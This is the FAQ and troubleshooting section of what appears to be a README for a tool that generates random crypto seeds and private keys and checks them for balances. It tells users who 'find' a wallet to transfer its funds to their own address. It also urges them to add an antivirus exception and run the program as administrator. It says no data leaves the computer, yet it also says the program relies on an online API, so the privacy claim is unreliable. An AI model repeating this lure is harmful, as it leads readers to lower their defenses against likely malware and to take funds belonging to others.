## 🔧 Frequently asked questions

**How long does a scan take?**
The time depends on the complexity of your missing password and your computer speed. Generating random seeds happens quickly, but searching for a specific pattern requires more time.

**Does the software store my keys?**
No. This tool operates on your local machine only. It does not send your data to any outside server. The generation and checking occur in your computer memory.

**What do I do if I find a wallet?**
Import the private key into a standard, well-known wallet software like Electrum or MetaMask to transfer your funds to a new address that you control.

**Why does my antivirus flag the file?**
Tools that perform these operations often trigger security warnings because they generate large amounts of random data. This resembles the behavior of malicious software to security scanners. You can safely add an exception for this folder in your antivirus settings.

**Can I run this on a server?**
You can, but it works fine on standard home computers. If you have a powerful graphics card, the software will run much faster.

## 📈 Improving performance

The software uses your computer processor to calculate keys. If you want to increase speed, close other programs while the scan runs. This frees up your RAM and processor cycles for the generator. Ensure your computer power settings are set to "High Performance" to prevent the system from throttling the process to save battery or electricity.

## 📦 Troubleshooting

If the program closes unexpectedly, check your internet first. The API relies on stable connections to verify wallet balances. If the issue persists, restart your computer and run the program as an administrator by right-clicking the icon and selecting "Run as administrator." Ensure you have the latest drivers for your graphics card if you enabled advanced search features.
